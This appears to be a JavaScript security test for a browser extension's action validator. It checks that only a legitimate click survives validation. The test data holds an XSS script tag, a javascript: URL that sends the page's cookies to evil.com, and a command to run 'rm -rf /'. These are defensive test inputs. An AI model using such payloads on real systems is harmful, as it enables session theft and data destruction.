import { validateActions } from './extension/background/action-validator.js';

const maliciousPayloads = [
  // 1. XSS in selector
  {
    type: 'click',
    selector: '<script>alert(1)</script>'
  },
  // 2. JavaScript protocol in navigate
  {
    type: 'navigate',
    value: 'javascript:fetch("http://evil.com?c="+document.cookie)'
  },
  // 3. Unknown action type
  {
    type: 'system_execute',
    command: 'rm -rf /'
  },
  // 4. Missing required selector
  {
    type: 'click'
  },
  // 5. Missing required value for typing
  {
    type: 'type',
    selector: '#password'
  },
  // 6. Legitimate action
  {
    type: 'click',
    selector: '#login-btn'
  }
];

console.log("Testing Malicious Payloads against Action Validator...");
const safeActions = validateActions(maliciousPayloads);

console.log(`\nInput Actions: ${maliciousPayloads.length}`);
console.log(`Safe Actions Returned: ${safeActions.length}`);
console.log("\nSafe Actions Data:");
console.log(JSON.stringify(safeActions, null, 2));

if (safeActions.length === 1 && safeActions[0].selector === '#login-btn') {
  console.log("\n[OK] Action security test PASSED. All malicious inputs were blocked.");
} else {
  console.log("\n[FAIL] Action security test FAILED. A malicious input got through.");
  process.exit(1);
}
